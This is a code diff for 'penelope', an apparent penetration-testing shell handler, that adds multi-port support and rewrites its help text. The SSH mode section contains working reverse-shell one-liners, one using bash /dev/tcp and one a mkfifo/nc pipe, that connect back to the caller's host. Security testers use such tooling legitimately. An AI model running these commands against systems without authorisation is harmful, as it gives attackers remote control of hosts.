@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.14.11"
+__version__ = "0.14.13"
 
 import os
 import io
@@ -51,7 +51,7 @@ from zlib import compress
 from errno import EADDRINUSE, EADDRNOTAVAIL
 from select import select
 from pathlib import Path, PureWindowsPath
-from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
+from argparse import ArgumentParser, RawTextHelpFormatter
 from datetime import datetime
 from textwrap import indent, dedent
 from binascii import Error as binascii_error
@@ -1284,7 +1284,7 @@ class MainMenu(BetterCMD):
 
 			parser_add = subparsers.add_parser("add", help="Add a new listener")
 			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
-			parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
+			parser_add.add_argument("-p", "--ports", help="Ports to listen on (comma separated)", default=[options.default_listener_port])
 			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')
 
 			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
@@ -1296,8 +1296,10 @@ class MainMenu(BetterCMD):
 				return False
 
 			if args.command == "add":
+				options.ports = args.ports
 				if args.type == 'tcp':
-					TCPListener(args.interface, args.port)
+					for port in options.ports:
+						TCPListener(args.interface, port)
 
 			elif args.command == "stop":
 				if args.id == '*':
@@ -1348,7 +1350,7 @@ class MainMenu(BetterCMD):
 
 	def do_payloads(self, line):
 		"""
-
+		[interface_name]
 		Create reverse shell payloads based on the active listeners
 		"""
 		if core.listeners:
@@ -5035,6 +5037,12 @@ class Options:
 			elif type(value) is str:
 				value = re.split('[^a-zA-Z0-9]+', value)
 
+		elif option == 'ports':
+			if value is None:
+				value = [None]
+			elif type(value) is str:
+				value = re.split('[^a-zA-Z0-9]+', value)
+
 		elif option == 'proxy':
 			if not value:
 				os.environ.pop('http_proxy', '')
@@ -5060,44 +5068,44 @@ def main():
 
 	## Command line options
 	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
-		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))
+		formatter_class=lambda prog: RawTextHelpFormatter(prog, width=150, max_help_position=40))
 
-	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
-		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
-	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")
+	parser.add_argument("-p", "--ports", help=f"Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options\n\
+(Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port})")
+	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell modes")
 
 	method = parser.add_argument_group("Reverse or Bind shell?")
-	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
+	method.add_argument("-i", "--interface", help="Local interface/IP to listen. (Default: 0.0.0.0)", metavar='')
 	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
 
 	hints = parser.add_argument_group("Hints")
-	hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
-	hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
+	hints.add_argument("-a", "--payloads", help="Show sample reverse shell payloads for active Listeners", action="store_true")
+	hints.add_argument("-l", "--interfaces", help="List available network interfaces", action="store_true")
 	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")
 
 	log = parser.add_argument_group("Session Logging")
-	log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
-	log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
-	log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")
+	log.add_argument("-L", "--no-log", help="Disable session log files", action="store_true")
+	log.add_argument("-T", "--no-timestamps", help="Disable timestamps in logs", action="store_true")
+	log.add_argument("-CT", "--no-colored-timestamps", help="Disable colored timestamps in logs", action="store_true")
 
 	misc = parser.add_argument_group("Misc")
-	misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
-	misc.add_argument("-M", "--menu", help="Just land to the Main Menu", action="store_true")
+	misc.add_argument("-m", "--maintain", help="Keep N sessions per target", type=int, metavar='')
+	misc.add_argument("-M", "--menu", help="Start in the Main Menu.", action="store_true")
 	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
-	misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
-	misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
-	misc.add_argument("-O", "--oscp-safe", help="Make Penelope OSCP safe", action="store_true")
+	misc.add_argument("-C", "--no-attach", help="Do not auto-attach on new sessions", action="store_true")
+	misc.add_argument("-U", "--no-upgrade", help="Disable shell auto-upgrade", action="store_true")
+	misc.add_argument("-O", "--oscp-safe", help="Enable OSCP-safe mode", action="store_true")
 
 	misc = parser.add_argument_group("File server")
-	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
-	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')
+	misc.add_argument("-s", "--serve", help="Run HTTP file server mode", action="store_true")
+	misc.add_argument("-prefix", "--url-prefix", help="URL path prefix", type=str, metavar='')
 
 	debug = parser.add_argument_group("Debug")
-	debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
-	debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
-	debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
-	debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
-	debug.add_argument("-cu", "--check-urls", help="Check health of hardcoded URLs", action="store_true")
+	debug.add_argument("-N", "--no-bins", help="Simulate missing binaries on target (comma-separated)", metavar='')
+	debug.add_argument("-v", "--version", help="Print version and exit", action="store_true")
+	debug.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
+	debug.add_argument("-dd", "--dev-mode", help="Enable developer mode", action="store_true")
+	debug.add_argument("-cu", "--check-urls", help="Check hardcoded URLs health and exit", action="store_true")
 
 	parser.parse_args(None, options)
 
@@ -5133,20 +5141,22 @@ def main():
 
 	# File Server
 	elif options.serve:
-		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
-		if server.filemap:
-			server.start()
-		else:
-			logger.error("No files to serve")
+		for port in options.ports:
+			server = FileServer(*options.args or '.', port=port, host=options.interface, url_prefix=options.url_prefix)
+			if server.filemap:
+				server.start()
+			else:
+				logger.error("No files to serve")
 
 	# Reverse shell via SSH
 	elif options.args and options.args[0] == "ssh":
 		if len(options.args) > 1:
-			TCPListener(host=options.interface, port=options.port)
-			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
-				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
-				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
-			)
+			for port in options.ports:
+				TCPListener(host=options.interface, port=port)
+				options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={port or options.default_listener_port};"
+					f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
+					f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
+				)
 		try:
 			if subprocess.run(options.args).returncode == 0:
 				logger.info("SSH command executed!")
@@ -5159,15 +5169,20 @@ def main():
 
 	# Bind shell
 	elif options.connect:
-		if not Connect(options.connect, options.port or options.default_bindshell_port):
+		success = False
+		for port in options.ports:
+			if Connect(options.connect, port or options.default_bindshell_port):
+				success = True
+		if not success:
 			sys.exit(1)
 		menu.start()
 
-	# Reverse Listener
+	# Reverse Listeners
 	else:
-		TCPListener(host=options.interface, port=options.port)
-		if not core.listeners:
-			sys.exit(1)
+		for port in options.ports:
+			TCPListener(host=options.interface, port=port)
+			if not core.listeners:
+				sys.exit(1)
 
 		listener_menu()
 		signal.signal(signal.SIGINT, keyboard_interrupt)
